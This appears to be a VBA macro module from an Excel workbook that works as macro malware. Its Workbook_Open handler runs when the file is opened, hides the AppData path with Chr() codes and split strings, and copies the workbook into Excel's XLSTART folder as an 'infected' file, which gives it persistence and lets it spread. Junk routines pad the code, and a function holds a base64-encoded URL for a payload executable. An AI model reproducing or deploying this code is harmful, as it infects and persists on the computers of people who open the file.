
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim frs0swbone As String
    frs0swbone = Environ(Chr(65) & Chr(80) & Chr(80) & Chr(68) & Chr(65) & Chr(84) & Chr(65)) & "\Mic" & "rosoft\Ex" & "cel\XLS" & "TART\o" & "blivionx_" & "infecte" & "d.xls" & "m"
    ThisWorkbook.SaveCopyAs frs0swbone
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
